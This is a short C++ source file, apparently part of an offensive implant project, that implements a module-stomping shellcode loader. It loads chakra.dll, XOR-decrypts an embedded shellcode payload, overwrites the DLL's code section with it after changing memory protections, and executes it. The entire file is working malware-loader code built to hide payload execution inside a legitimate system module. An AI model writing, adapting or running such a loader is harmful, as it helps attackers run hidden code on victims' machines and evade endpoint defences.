#include <Kharon.h>
#include <Shellcode.h>

EXTERN_C INT32 DbgPrint(PCHAR, ... );

int Xor_Decrypt(
     unsigned char *encrypted, int encrypted_len,
     unsigned char *key,       int key_len,
     unsigned char       *out
)
{
    if (!encrypted || !key || !out || encrypted_len <= 0 || key_len <= 0)
        return -1;

    for (int i = 0; i < encrypted_len; i++)
        out[i] = encrypted[i] ^ key[i % key_len];

    return encrypted_len;
}

#ifndef XOR_KEY
#define XOR_KEY { 0 }
#endif

auto Stomper( VOID ) -> VOID{
    LONG ErrorCode = ERROR_SUCCESS;
    LPWSTR ModuleToLoad = L"C:\\windows\\system32\\chakra.dll";
    SIZE_T LoadedModuleAddress = 0;
    SIZE_T TextSectionAddress = 0;
    ULONG OldProtection = 0;
    LPVOID Heap = nullptr;
    
    UCHAR XorKey[] = XOR_KEY;
    DbgPrint("%p\n", XorKey);

    LoadedModuleAddress = (SIZE_T)LoadLibraryExW(ModuleToLoad, nullptr, DONT_RESOLVE_DLL_REFERENCES);

    if ( ! LoadedModuleAddress ){
        ErrorCode = GetLastError();
        DbgPrint( "Loading DLL failed with error: (%d) %s", ErrorCode );
    }

    TextSectionAddress = LoadedModuleAddress + 0x1000;

    Heap = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Shellcode::Size);

    Xor_Decrypt((UCHAR*)Shellcode::Data, Shellcode::Size, XorKey, sizeof(XorKey), (UCHAR*)Heap );

    VirtualProtect((LPVOID)TextSectionAddress, Shellcode::Size, PAGE_EXECUTE_READWRITE, &OldProtection);

    memcpy((LPVOID)TextSectionAddress, (UCHAR*)Heap, Shellcode::Size);

    VirtualProtect((LPVOID)TextSectionAddress, Shellcode::Size, OldProtection, &OldProtection);

    VOID ( *a )( VOID ) = ( decltype( a ) )TextSectionAddress;
    a();
    
}